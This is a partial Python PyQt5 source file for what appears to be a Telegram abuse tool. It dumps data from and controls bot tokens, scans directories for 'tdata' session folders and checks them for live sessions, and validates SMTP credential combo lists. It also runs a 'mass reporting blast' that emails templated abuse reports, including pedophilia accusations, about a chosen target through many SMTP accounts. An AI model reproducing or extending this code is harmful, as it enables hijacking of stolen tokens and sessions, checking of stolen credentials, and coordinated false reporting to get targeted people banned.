import json, os, re, random, string, sys, webbrowser, requests, datetime, sqlite3, telebot, asyncio, socks, shutil, argparse, subprocess, threading, getpass, functools, tracemalloc, signal, flask
from PyQt5 import QtCore, QtGui, QtWidgets, uic
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QKeySequence
import telethon
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetMessagesRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import GetUserPhotosRequest
from telethon.tl.types import *
from telethon.errors.rpcerrorlist import AccessTokenExpiredError, RpcCallFailError
from telethon.errors import SessionPasswordNeededError
from loguru import logger
from cryptography.fernet import Fernet
from colorama import Fore, Style
from aiohttp import ClientSession
from data.database import *
from dumper_functions.dumper_functions import DumperFunctions
from custom_text_edit import CustomTextEdit
from reporting import login_telegram, report_user, password_callback, console_callback, code_callback
import asyncio
from asyncio import Semaphore
import datetime
from datetime import date
from reporting import login_telegram, report_user
from PyQt5.QtWidgets import QMainWindow, QComboBox, QButtonGroup, QTextEdit, QProgressDialog, QInputDialog, QLineEdit
from PyQt5.QtCore import QObject, pyqtSignal
from PyQt5.QtWidgets import QMainWindow
from PyQt5.QtCore import QTimer
import smtplib
from PyQt5.QtWidgets import QMessageBox
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Import specific functions if needed
from bot.bot import launch_bot, list_tokens
from convert.convert_tdata import convert_tdata
from dumper_functions.checker import check_sess
from dumper_functions.xuy import Result
from dumper_functions.results import saver
from telethon.network import ConnectionTcpFull



tracemalloc.start()




def colorama_to_html(text):
    text = text.replace(Fore.RED, '<span style="color:red;">')
    text = text.replace(Fore.GREEN, '<span style="color:green;">')
    text = text.replace(Fore.YELLOW, '<span style="color:yellow;">')
    text = text.replace(Fore.BLUE, '<span style="color:blue;">')
    text = text.replace(Fore.MAGENTA, '<span style="color:magenta;">')
    text = text.replace(Fore.CYAN, '<span style="color:cyan;">')
    text = text.replace(Fore.WHITE, '<span style="color:white;">')
    text = text.replace(Style.RESET_ALL, '</span>')
    return text



print("Current working directory:", os.getcwd())

API_ID = 
API_HASH = ""
HISTORY_DUMP_STEP = 200
LOOKAHEAD_STEP_COUNT = 0
all_chats = {}
all_users = {}
messages_by_chat = {}
base_path = ''



class SMTPCheckerThread(QThread):
    result_signal = pyqtSignal(str, bool)
    finished_signal = pyqtSignal()

    def __init__(self, smtp_strings):
        super().__init__()
        self.smtp_strings = smtp_strings
        self.is_cancelled = False
    def run(self):
        for smtp_string in self.smtp_strings:
            if self.is_cancelled:
                self.result_signal.emit("SMTP check cancelled by user.", False)
                break
            
            if smtp_string.strip():
                try:
                    host, port, username, password = smtp_string.split('|')
                    port = int(port.strip())
                    
                    self.result_signal.emit(f"Checking: {host}:{port} with username {username}", False)
                    
                    with smtplib.SMTP(host, port, timeout=10) as server:
                        server.ehlo()
                        server.starttls()
                        server.ehlo()
                        server.login(username.strip(), password.strip())
                        
                    self.result_signal.emit(f"Success: Connection established to {host}:{port}", True)
                except Exception as e:
                    self.result_signal.emit(f"Error: {str(e)}", False)
        
        self.finished_signal.emit()


    def cancel(self):
        self.is_cancelled = True






class CustomTextEdit(QPlainTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)

    def keyPressEvent(self, event):
        # Check if Ctrl+A (or Cmd+A on Mac) is pressed
        if event.matches(QKeySequence.SelectAll):
            self.selectAllTokens()
        else:
            super().keyPressEvent(event)

    def selectAllTokens(self):
        cursor = self.textCursor()
        cursor.select(cursor.Document)
        selected_text = cursor.selectedText()
        
        # Split the text into lines and filter out empty lines
        tokens = [line.strip() for line in selected_text.split('\n') if line.strip()]
        
        # Create a new selection that only includes the tokens
        new_selection = ''
        cursor.setPosition(0)
        for token in tokens:
            start = self.document().find(token, cursor.position()).position()
            end = start + len(token)
            cursor.setPosition(start)
            cursor.setPosition(end, cursor.KeepAnchor)
            new_selection += cursor.selectedText() + '\n'
            cursor.setPosition(end)
        
        # Set the new selection
        cursor.setPosition(0)
        for token in tokens:
            cursor_temp = self.document().find(token, cursor.position())
            if not cursor_temp.isNull():
                cursor.setPosition(cursor_temp.position())
                cursor.setPosition(cursor_temp.position() + len(token), cursor.KeepAnchor)
                self.setTextCursor(cursor)
                cursor.setPosition(cursor_temp.position() + len(token))





class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()
        uic.loadUi('dumper.ui', self)
        self.current_thread = None
        self.smtp_strings = []
        self.connected_count = 0
        # Connect buttons
        self.dumpDocument_button.clicked.connect(self.sendDocument_function)
        self.dumpMessage_button.clicked.connect(self.dumpMessages)
        self.start_button.clicked.connect(self.async_start_function)
        self.stop_button.clicked.connect(self.stop_function)
        self.dumpPhoto_button.clicked.connect(self.dumpPhoto_function)
        self.submit_single_token_button.clicked.connect(self.checkTelegramBotStatus)
        self.console_text_response_button.clicked.connect(self.handleUserResponse)
        self.load_database_button.clicked.connect(self.openDatabaseFileDialog)
        self.import_bulk_button.clicked.connect(self.importBulkTokens)
        self.sync_button.clicked.connect(self.launch_bot)
        self.load_tdata_directory_button.clicked.connect(self.loadTdataDirectory)
        self.start_tdata_checker_button.clicked.connect(self.initiate_search)
        self.Start_commandLinkButton.clicked.connect(self.start_spam_function)
        self.saveUser_button.clicked.connect(self.saveUser_function)
        self.saveChat_button.clicked.connect(self.saveChat_function)
        self.saveMedia_button.clicked.connect(self.saveMedia_function)
        self.generate_button.clicked.connect(self.generate_function)
        self.live_session_button.clicked.connect(self.live_session_function)
            
        self.dumper = DumperFunctions(
            self.console_text_edit_2,
            self.dumping_file_directory_comboBox,
            self.get_selected_token
        )
        self.token_dumper_tab = self.findChild(QWidget, "token_dumper_tab")
        if self.token_dumper_tab:
            self.tabWidget = self.token_dumper_tab.findChild(QTabWidget, "token_commander_tabWidget")
            if self.tabWidget:
                print("token_commander_tabWidget found")
                
                # Find and connect buttons in the "dumping_tab" (Dumping tab)
                dumping_tab = self.tabWidget.findChild(QWidget, "dumping_tab")
                if dumping_tab:
                    self.connect_button(dumping_tab, "dumpMessage_button", self.dump_message_function)
                    self.connect_button(dumping_tab, "saveUser_button", self.saveUser_function)
                    self.connect_button(dumping_tab, "dumpPhoto_button", self.dumpPhoto_function)
                    self.connect_button(dumping_tab, "saveText_button", self.save_text_history)
                    self.connect_button(dumping_tab, "dumpDocument_button", self.sendDocument_function)
                    self.connect_button(dumping_tab, "saveChat_button", self.saveChat_function)
                    self.connect_button(dumping_tab, "saveMedia_button", self.saveMedia_function)
                    self.connect_button(dumping_tab, "saveMedia_photo_button", self.saveMediaphoto_function)
                else:
                    print("Dumping tab not found!")
    
                # Find and connect buttons in the "managment_tab" (Management tab)
                management_tab = self.tabWidget.findChild(QWidget, "managment_tab")
                if management_tab:
                    self.connect_button(management_tab, "getME_button", self.stop_function)
                    self.connect_button(management_tab, "setWebhook_button", self.setwebhook_function)
                    self.connect_button(management_tab, "delWebhook_button", self.deletewebhook_function)
                    self.connect_button(management_tab, "launchWebhook_button", self.launch_webhook_host_function)
                    self.connect_button(management_tab, "set_privacy_button", self.set_privacy_function)
                    self.connect_button(management_tab, "logout_button", self.logout_function)

                else:
                    print("Management tab not found!")
    
                # Connect remaining buttons (if they exist in other tabs)
                self.connect_button(self.tabWidget, "sendText_button", self.send_text_function)
                self.connect_button(self.tabWidget, "sendAnimation_button", self.send_animation_function)
                self.connect_button(self.tabWidget, "sendFiles_button", self.send_files_function)
                self.connect_button(self.tabWidget, "sendAudio_button", self.send_audio_function)
                self.connect_button(self.tabWidget, "sendContact_button", self.send_contact_function)
                self.connect_button(self.tabWidget, "sendPoll_button", self.send_poll_function)
                self.connect_button(self.tabWidget, "sendPhoto_button", self.send_photo_function)
                self.connect_button(self.tabWidget, "sendVideo_button", self.send_video_function)
                self.connect_button(self.tabWidget, "sendPaidContent_button", self.send_paid_content_function)
                self.connect_button(self.tabWidget, "setReaction_button", self.set_reaction_function)
                self.connect_button(self.tabWidget, "setChatAction_button", self.set_chat_action_function)
                self.connect_button(self.tabWidget, "getupdate_button", self.getupdate_function)
            else:
                print("tabWidget not found!")
        else:
            print("token_dumper_tab not found!")

        # Initialize other properties
        self.tokens = []
        self.TOKEN_COLUMN = 1
        self.NAME_COLUMN = 2
        self.STATUS_COLUMN = 4
        self.ESTIMATED_TIME_PER_TOKEN = 2
        self.remove_offline_tokens_signal = pyqtSignal()
        self.tableWidget.setColumnCount(6)
        self.tableWidget.setHorizontalHeaderLabels([
            "Date", "Token", "Bot Name", "Username",
            "Status", "Dumped"
        ])
        self.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self.showContextMenu)
        self.tdata_contextMenu = QtWidgets.QMenu(self.tdata_treeWidget)
        self.token_dumper_tab = QtWidgets.QWidget()
        self.client = None
        self.dialog = None
        self.progressBar.setValue(0)
        self.progressBar.setMaximum(100)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_progress)

        self.total_tokens_lcdNumber.display(0)
        self.usernames = self.load_usernames("wordlists/usernames.txt")
        self.shortcut_select_all = QShortcut(QKeySequence("Ctrl+A"), self)
        self.loop = asyncio.get_event_loop()
        # Load bots and display stats
        self.loadBotsFromDatabase()
        self.displayStatsAndCounts()
        self.updateTokenCount()


        
        # Add reporting elements

        self.login_telegram_session_button.clicked.connect(self.login_to_telegram)

        self.checkbox_group = QButtonGroup(self)
        self.checkbox_group.setExclusive(True)

        # Add checkboxes to the button group
        self.checkbox_group.addButton(self.group_checkBox)
        self.checkbox_group.addButton(self.channel_checkBox)
        self.checkbox_group.addButton(self.account_checkBox)
        self.checkbox_group.buttonClicked.connect(self.on_checkbox_clicked)

        self.login_telegram_session_button.clicked.connect(self.start_login)
        self.start_reporting_button.clicked.connect(self.start_report)
        self.loop = asyncio.get_event_loop()
        asyncio.set_event_loop(self.loop)

        # Set up a timer to process asyncio events
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.process_asyncio_events)
        self.timer.start(10)  # 10ms interval
        self.reporting_reason_comboBox.currentTextChanged.connect(self.update_letter_console)
        self.smtp_check_button.clicked.connect(self.check_smtp_connections)
        self.start_reporting_button.clicked.connect(self.start_reporting_function)
        
        
            
    def start_reporting_function(self):
        try:
            # Check if there are any connected SMTPs
            smtp_count = self.connected_lcdNumber.value()
            if smtp_count == 0:
                QMessageBox.warning(self, 'No SMTPs Connected', 'Please connect to at least one SMTP server before starting the reporting process.')
                return

            # Check if a target type is selected
            if not (self.group_checkBox.isChecked() or self.channel_checkBox.isChecked() or self.account_checkBox.isChecked()):
                QMessageBox.warning(self, 'No Target Type Selected', 'Please select a target type (Group, Channel, or Account) before starting the reporting process.')
                return

            # Gather the required information
            reporting_reason = self.reporting_reason_comboBox.currentText()
            letter_template = self.letter_console_textedit.toPlainText()
            target_id = self.user_id_lineedit.toPlainText()

            # Determine the target type
            if self.group_checkBox.isChecked():
                target_type = "Group"
            elif self.channel_checkBox.isChecked():
                target_type = "Channel"
            elif self.account_checkBox.isChecked():
                target_type = "Account"
            else:
                target_type = "Unknown"  # This should never happen due to the earlier check

            # Create the confirmation message
            confirmation_msg = f"""
            You are about to start a mass reporting blast session.

            Details:
            - Number of SMTPs: {smtp_count}
            - Reporting Reason: {reporting_reason}
            - Target Type: {target_type}
            - Target ID: {target_id}

            Letter Template Preview:
            {letter_template[:100]}...

            Are you sure you want to proceed?
            """

            # Show the confirmation dialog
            reply = QMessageBox.question(self, 'Confirm Reporting Session', confirmation_msg, 
                                         QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

            if reply == QMessageBox.Yes:
                # User confirmed, start the reporting process
                self.begin_reporting_process(smtp_count, reporting_reason, letter_template, target_id, target_type)
            else:
                # User cancelled
                QMessageBox.information(self, 'Cancelled', 'Reporting session cancelled.')

        except AttributeError as e:
            error_msg = f"An error occurred while starting the reporting function:\n\n{str(e)}\n\nPlease check that all UI elements are correctly defined and accessible."
            QMessageBox.critical(self, "Error", error_msg)
        except Exception as e:
            error_msg = f"An unexpected error occurred:\n\n{str(e)}\n\nPlease contact the developer with this error message."
            QMessageBox.critical(self, "Unexpected Error", error_msg)

    def begin_reporting_process(self, smtp_count, reason, template, target_id, target_type):
        # Ensure smtp_count is an integer
        smtp_count = int(smtp_count)
    
        # Show initial message
        QMessageBox.information(self, 'Reporting Started', 'The reporting process has begun.')
    
        # Create a progress dialog
        progress = QProgressDialog("Sending reports...", "Cancel", 0, smtp_count, self)
        progress.setWindowModality(Qt.WindowModal)
        progress.setWindowTitle("Reporting Progress")
    
        # Clear the SMTP console
        self.smtp_console.clear()
        self.smtp_console.append("Starting reporting process...")
    
        # Get SMTP details (assuming they're stored in self.smtp_strings)
        smtp_details = self.smtp_strings[:smtp_count]
    
        successful_deliveries = 0
        remaining_reports = smtp_count
        number = 0  # Initialize the counter for sent letters
    
        # Initialize LCD displays
        self.sent_lcdNumber.display(0)
        self.left_lcdNumber.display(remaining_reports)
    
        for i, smtp_string in enumerate(smtp_details):
            if progress.wasCanceled():
                self.smtp_console.append("Process cancelled by user.")
                break
    
            try:
                # Parse SMTP details
                host, port, username, password = smtp_string.split(',')
    
                # Fill the template
                filled_template = template.replace("[Target ID]", target_id).replace("[Target Type]", target_type)
    
                # Prepare the email
                msg = MIMEMultipart()
                msg["From"] = username  # Use the SMTP username as the From field
                msg["To"] = "report@telegram.org"  # Replace with the actual recipient email
                msg["Subject"] = "Report Abuse"
                msg.attach(MIMEText(filled_template, "plain"))
    
                # Connect to SMTP server and send the email
                with smtplib.SMTP(host, int(port)) as server:
                    server.starttls()
                    server.login(username, password)
                    server.send_message(msg)
    
                # Update counters and displays
                successful_deliveries += 1
                number += 1  # Increment the counter for sent letters
    
                # Update progress, SMTP console, and LCD displays
                delivery_message = f"Report {i + 1} sent successfully via {username} for {target_type} {target_id}. Total sent: {number}"
                self.smtp_console.append(delivery_message)
                self.smtp_console.ensureCursorVisible()
                self.sent_lcdNumber.display(successful_deliveries)
    
                # Update the number display (assuming you have a QLabel or similar widget for this)
                self.number_label.setText(str(number))
    
            except smtplib.SMTPException as smtp_error:
                error_message = f"SMTP error sending report {i + 1} via {username}: {str(smtp_error)}"
                self.smtp_console.append(error_message)
                self.smtp_console.ensureCursorVisible()
    
            except Exception as e:
                error_message = f"Error sending report {i + 1} via {username}: {str(e)}"
                self.smtp_console.append(error_message)
                self.smtp_console.ensureCursorVisible()
    
            finally:
                # Update progress and remaining reports count
                progress.setValue(i + 1)
                remaining_reports -= 1
                self.left_lcdNumber.display(remaining_reports)
    
        # Finalize only after all letters have been processed
        progress.setValue(smtp_count)
        summary_message = f"Reporting Complete. Successfully sent {successful_deliveries} out of {smtp_count} reports for {target_type} {target_id}. Total letters sent: {number}"
        self.smtp_console.append(summary_message)
        QMessageBox.information(self, 'Reporting Complete', summary_message)
        
        
        
        
        
    def start_smtp_check(self):
        self.smtp_console.clear()
        self.smtp_strings = [s.strip() for s in self.smtp_combo_textedit.toPlainText().split('\n') if s.strip()]
        self.connected_count = 0
        self.connected_lcdNumber.display(self.connected_count)
        self.check_next_smtp()



    def check_smtp_connections(self):
        self.smtp_console.clear()
        self.connected_count = 0
        self.connected_lcdNumber.display(self.connected_count)
        smtp_strings = self.smtp_combo_textedit.toPlainText().split('\n')
        
        self.smtp_thread = SMTPCheckerThread(smtp_strings)
        self.smtp_thread.result_signal.connect(self.handle_smtp_result)
        self.smtp_thread.finished_signal.connect(self.on_smtp_check_finished)
        self.smtp_thread.start()
        
        self.smtp_check_button.setEnabled(False)
        self.smtp_cancel_check_button.setEnabled(True)


    def cancel_smtp_check(self):
        if self.smtp_thread and self.smtp_thread.isRunning():
            self.smtp_thread.cancel()
            self.smtp_console.append("SMTP check cancelled by user.")
            self.smtp_cancel_check_button.setEnabled(False)
    


    def on_smtp_check_finished(self):
        self.smtp_check_button.setEnabled(True)
        self.smtp_cancel_check_button.setEnabled(False)
        self.smtp_threads.setValue(self.connected_count)
        self.smtp_console.append("SMTP check completed.")

    def check_next_smtp(self):
        if self.smtp_strings:
            smtp_string = self.smtp_strings.pop(0)
            self.current_thread = SMTPCheckerThread(smtp_string)
            self.current_thread.result_signal.connect(self.handle_smtp_result)
            self.current_thread.finished.connect(self.check_next_smtp)
            self.smtp_threads.append(self.current_thread)  # Use self.smtp_threads instead of self.thread
            self.current_thread.start()
        else:
            self.smtp_check_button.setEnabled(True)
            self.cleanup_threads()

    def handle_smtp_result(self, message, is_success):
        self.smtp_console.append(message)
        if is_success:
            self.connected_count += 1
            self.connected_lcdNumber.display(self.connected_count)

    def cleanup_threads(self):
        for thread in self.smtp_threads[:]:
            if not thread.isRunning():
                self.smtp_threads.remove(thread)
                thread.deleteLater()


    def read_letter_file(self, filename):
        file_path = os.path.join('letters', filename)
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                return file.read()
        except FileNotFoundError:
            return f"Error: File '{filename}' not found in the 'letters' directory."
        except Exception as e:
            return f"Error reading file: {str(e)}"

    def update_letter_console(self):
        selected_reason = self.reporting_reason_comboBox.currentText()
        
        if selected_reason == "Impersonation":
            letter_file = "impersonation_letter.txt"
        elif selected_reason == "Sharing Illegal Content":
            letter_file = "illegal_content_letter.txt"
        elif selected_reason == "Scams and Fraud":
            letter_file = "scams_fraud_letter.txt"
        elif selected_reason == "Harassment and Threats":
            letter_file = "harassment_threats_letter.txt"
        elif selected_reason == "Pedophile":
            letter_file = "pedophile_letter.txt"
        elif selected_reason == "Promoting Violence":
            letter_file = "promoting_violence_letter.txt"
        elif selected_reason == "Mass Spamming":
            letter_file = "mass_spamming_letter.txt"  # New case for Mass Spamming
        else:
            self.letter_console_textedit.clear()
            return

        letter_content = self.read_letter_file(letter_file)
        
        # Add the bold text for name, contact info, and username
        formatted_content = (
            "<b>[Your Name]</b><br>"
            "<b>[Your Contact Information]</b><br>"
            "<b>[Account Username]</b><br><br>"
            f"{letter_content}"
        )
        
        self.letter_console_textedit.setHtml(formatted_content)
        
        self.letter_console_textedit.setHtml(formatted_content)

    def process_asyncio_events(self):
        self.loop.stop()
        self.loop.run_forever()

    def start_report(self):
        asyncio.create_task(self.report_telegram_user())

    def on_checkbox_clicked(self, checkbox):
        # This method will be called when a checkbox is clicked
        print(f"Checkbox clicked: {checkbox.text()}")
        # You can add more logic here based on which checkbox was clicked

    def code_callback(self):
        code, ok = QInputDialog.getText(self, "Telegram Code", "Enter the code sent to your Telegram account:")
        if ok:
            return code
        return None

    def password_callback(self):
        password, ok = QInputDialog.getText(self, "Telegram Password", "Enter your Two-Step Verification password:", QLineEdit.Password)
        if ok:
            return password
        return None

    def console_callback(self, message):
        self.smtp_console.append(message)

    def start_login(self):
        asyncio.ensure_future(self.login_to_telegram(), loop=self.loop)

    async def login_to_telegram(self):
        api_id = self.api_id_textedit.toPlainText()
        api_hash = self.api_hash_textedit.toPlainText()
        phone_number = self.telegram_phone_number_textedit.toPlainText()

        try:
            await login_telegram(
                api_id, 
                api_hash, 
                phone_number, 
                self.code_callback, 
                self.password_callback, 
                self.console_callback
            )
            self.console_callback("Logged in successfully!")
        except Exception as e:
            self.console_callback(f"Error logging in: {str(e)}")

    async def report_telegram_user(self):
        pass
        
        
    def run_async_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
        
    async def run_tasks(self, tasks):
        return await asyncio.gather(*tasks, return_exceptions=True)


    def report_user(self):
        user_id = self.user_id_textedit.text()
        reason = self.reporting_reason_comboBox.currentText()
        comment = self.report_comment_textedit.text()
        
        asyncio.get_event_loop().run_until_complete(
            report_user(user_id, reason, comment, self.console_callback)
        )


    async def async_start_function(self, directory_path):
        tdata_count = 0
        total_dirs = sum([len(dirs) for _, dirs, _ in os.walk(directory_path)])
        processed_dirs = 0
        
        string_sessions = {}
        
        for root, dirs, files in os.walk(directory_path):
            for dir_name in dirs:
                if dir_name.lower() in ['tdata', 'Profile_1']:
                    tdata_count += 1
                    full_path = os.path.join(root, dir_name)
                    await self.update_tdata_console_async(f"Found: {full_path}")
                    string_sessions[dir_name] = full_path
                processed_dirs += 1
                self.processed_dirs = processed_dirs
                self.total_dirs = total_dirs
                await asyncio.sleep(0)
        
        await self.update_tdata_console_async(f'Search complete. Found {len(string_sessions)} sessions.')
        await self.update_tdata_console_async('Starting to check for live sessions...')
    
        sem = asyncio.Semaphore(10)  # Adjust the number as needed
        
        tasks = [self.check_sess(p, s, sem) for s, p in string_sessions.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    
        await self.update_tdata_console_async('All sessions checked.')
        for result in results:
            await self.update_tdata_console_async(str(result))
        
        self.timer.stop()
        self.tdata_total_lcdNumber.display(tdata_count)
        return results

    def on_async_complete(self, future):
        try:
            results = future.result()
            self.update_tdata_console("Async operation completed successfully.")
        except Exception as e:
            self.update_tdata_console(f"An error occurred: {str(e)}")

    def update_progress(self):
        if hasattr(self, 'processed_dirs') and hasattr(self, 'total_dirs'):
            progress = int((self.processed_dirs / self.total_dirs) * 100)
            self.progressBar.setValue(progress)

    async def update_tdata_console_async(self, message):
        self.update_tdata_console(message)
        await asyncio.sleep(0)


    async def check_sess(self, p, s, sem):
        async with sem:
            # Your session checking logic here
            await asyncio.sleep(1)  # Simulating some work
            return f"Checked session: {s}"

    def get_selected_token(self):
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            return None
        # Assuming the token is in the second column (index 1)
        return selected_items[1].text()

    # You can now use the dumper functions like this:
    async def some_function_that_dumps_messages(self):
        await self.dumper.dumpMessages(messages_by_chat)



    def connect_button(self, parent_widget, button_name, function):
        button = parent_widget.findChild(QPushButton, button_name)
        if button:
            button.clicked.connect(function)
        else:
            print(f"{button_name} not found in {parent_widget.objectName()}!")


    def getupdate_function(self):
        reply = QMessageBox.question(self, 'Get Update for bot?', 
                                    "Are you sure you want to print an update of the bot's interactions?",
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.console_text_edit_2.append("Fetching updates for the bot...")
            
            # Get the selected row
            selected_items = self.tableWidget.selectedItems()
            if not selected_items:
                self.console_text_edit_2.append("Error: No token selected. Please select a row in the table.")
                return
            
            # Get the token from the selected row (assuming TOKEN_COLUMN is the correct column index)
            selected_row = selected_items[0].row()
            bot_token = self.tableWidget.item(selected_row, self.TOKEN_COLUMN).text()
            
            if not bot_token:
                self.console_text_edit_2.append("Error: Selected row does not contain a valid token.")
                return
            
            # Make a request to the Telegram API
            url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
            try:
                response = requests.get(url)
                response.raise_for_status()  # Raise an exception for bad status codes
                
                # Parse the JSON response
                updates = response.json()
                
                # Pretty print the JSON response
                formatted_json = json.dumps(updates, indent=2)
                
                # Display the formatted JSON in the console
                self.console_text_edit_2.append("Bot updates (JSON response):")
                self.console_text_edit_2.append(formatted_json)
            
            except requests.RequestException as e:
                self.console_text_edit_2.append(f"Error fetching updates: {str(e)}")
            except json.JSONDecodeError:
                self.console_text_edit_2.append("Error: Invalid JSON response from the server.")
        else:
            self.console_text_edit_2.append("Get Update View Cancelled.")
    
    def stop_function(self):
        reply = QMessageBox.question(self, 'Stop Bot', 
                                     "Are you sure you want to stop the bot?",
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.console_text_edit_2.append("Stopping the bot...")
            # Implement actual stop logic here
        else:
            self.console_text_edit_2.append("Bot stop cancelled")

    def setwebhook_function(self):
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No token selected. Please select a token from the table.")
            return
    
        # Assuming the token is in the second column (index 1)
        selected_token = selected_items[1].text()
    
        url, ok = QInputDialog.getText(self, 'Set Webhook', 'Enter the webhook URL:')
        if ok and url:
            try:
                bot = telebot.TeleBot(selected_token)
                result = bot.set_webhook(url=url)
                self.console_text_edit_2.append(f"Webhook set for token {selected_token[:10]}...: {result}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to set webhook: {str(e)}")
        else:
            self.console_text_edit_2.append("Webhook setting cancelled")


    def deletewebhook_function(self):
        # Get the selected row
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No token selected. Please select a row in the table.")
            return
    
        # Get the token from the selected row
        selected_row = selected_items[0].row()
        bot_token = self.tableWidget.item(selected_row, self.TOKEN_COLUMN).text()
    
        if not bot_token:
            self.console_text_edit_2.append("Error: Selected row does not contain a valid token.")
            return
    
        # Confirm action with user
        reply = QMessageBox.question(self, 'Delete Webhook', 
                                    f"Are you sure you want to delete the webhook for bot with token {bot_token}?",
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            try:
                # Make a request to delete the webhook
                url = f"https://api.telegram.org/bot{bot_token}/deleteWebhook"
                response = requests.get(url)
                response.raise_for_status()  # Raise an exception for bad status codes
                
                result = response.json()
                
                if result.get("ok"):
                    self.console_text_edit_2.append(f"Webhook deleted successfully for bot with token {bot_token}")
                    
                    # Update the status in the table if you have a column for webhook status
                    # status_item = self.tableWidget.item(selected_row, self.WEBHOOK_STATUS_COLUMN)
                    # if status_item:
                    #     status_item.setText("No Webhook")
                else:
                    self.console_text_edit_2.append(f"Failed to delete webhook: {result.get('description')}")
            
            except requests.RequestException as e:
                QMessageBox.warning(self, 'Error', f"Failed to delete webhook for bot with token {bot_token}: {str(e)}")
        else:
            self.console_text_edit_2.append("Delete webhook operation cancelled")
    
    def launch_webhook_host(self):
        app = Flask(__name__)
        
        @app.route('/' + self.get_current_token(), methods=['POST'])
        def webhook():
            update = request.get_json()
            # Process the update here
            self.console_text_edit_2.append(f"Received update: {update}")
            return "OK"
    
        def run_flask():
            app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))
    
        # Start Flask in a separate thread
        threading.Thread(target=run_flask, daemon=True).start()
        
        self.console_text_edit_2.append("Webhook host launched on port 8443")
    
    # Add this to your MainWindow class
    def launch_webhook_host_function(self):
        reply = QMessageBox.question(self, 'Launch Webhook Host', 
                                    "Are you sure you want to launch the webhook host?",
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.launch_webhook_host()
        else:
            self.console_text_edit_2.append("Webhook host launch cancelled")

    def logout_function(self):
        # Get the selected row
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No token selected. Please select a row in the table.")
            return
    
        # Get the token from the selected row
        selected_row = selected_items[0].row()
        bot_token = self.tableWidget.item(selected_row, self.TOKEN_COLUMN).text()
    
        if not bot_token:
            self.console_text_edit_2.append("Error: Selected row does not contain a valid token.")
            return
    
        reply = QMessageBox.question(self, 'Logout', 
                                    f"Are you sure you want to log out bot with token {bot_token}? This will revoke your bot's token.",
                                    QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            bot = telebot.TeleBot(bot_token)
            try:
                result = bot.log_out()
                self.console_text_edit_2.append(f"Logged out bot with token {bot_token}: {result}")
                
                # Update the status in the table
                status_item = self.tableWidget.item(selected_row, self.STATUS_COLUMN)
                if status_item:
                    status_item.setText("Logged Out")
                
                # You might want to remove the token from your database here
                # self.remove_token_from_database(bot_token)
                
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to log out bot with token {bot_token}: {str(e)}")
        else:
            self.console_text_edit_2.append("Logout cancelled")

    def set_privacy_function(self):
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No token selected. Please select a token from the table.")
            return
    
        # Assuming the token is in the second column (index 1)
        selected_token = selected_items[1].text()
    
        options = ['Allow', 'Disallow']
        mode, ok = QInputDialog.getItem(self, 'Set Privacy', 
                                        'Select privacy mode:', options, 0, False)
        if ok and mode:
            try:
                bot = telebot.TeleBot(selected_token)
                chat_id = self.telegram_chat_id_text_input.toPlainText()
                if not chat_id:
                    raise ValueError("Chat ID is missing. Please enter a valid Chat ID.")
                
                result = bot.set_chat_permissions(chat_id, can_send_messages=(mode=='Allow'))
                self.console_text_edit_2.append(f"Privacy set for token {selected_token[:10]}...: {result}")
            except Exception as e:
                QMessageBox.warning(self, 'Error', f"Failed to set privacy: {str(e)}")
        else:
            self.console_text_edit_2.append("Privacy setting cancelled")
    
    def dump_message_function(self):
        self.console_text_edit_2.append("Dump Message function called")

    def send_text_function(self):
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No token selected. Please select a token from the table.")
            return
    
        # Assuming the token is in the second column (index 1)
        selected_token = selected_items[1].text()
    
        self.console_text_edit_2.append("Please type your message in the console_text_response_input and click the console_text_response_button to send.")
        
        # Disconnect any previous connections to avoid multiple connections
        try:
            self.console_text_response_button.clicked.disconnect()
        except TypeError:
            # If there was no connection, it's fine, just pass
            pass
    
        # Connect the button to a new function that will send the message
        self.console_text_response_button.clicked.connect(lambda: self.send_message_with_token(selected_token))
    
    def send_message_with_token(self, token):
        message = self.console_text_response_input.toPlainText()
        if not message:
            self.console_text_edit_2.append("Error: No message entered. Please type a message and try again.")
            return
    
        try:
            bot = telebot.TeleBot(token)
            result = bot.send_message(self.get_current_chat_id(), message)
            self.console_text_edit_2.append(f"Text sent using token {token[:10]}...: Message ID {result.message_id}")
            # Clear the input field after sending
            self.console_text_response_input.clear()
        except Exception as e:
            self.console_text_edit_2.append(f"Error sending message: {str(e)}")
    
        # Disconnect the button after sending to avoid multiple sends
        self.console_text_response_button.clicked.disconnect()

    def send_animation_function(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Animation File", "", 
                                                   "GIF Files (*.gif);;All Files (*)")
        if file_name:
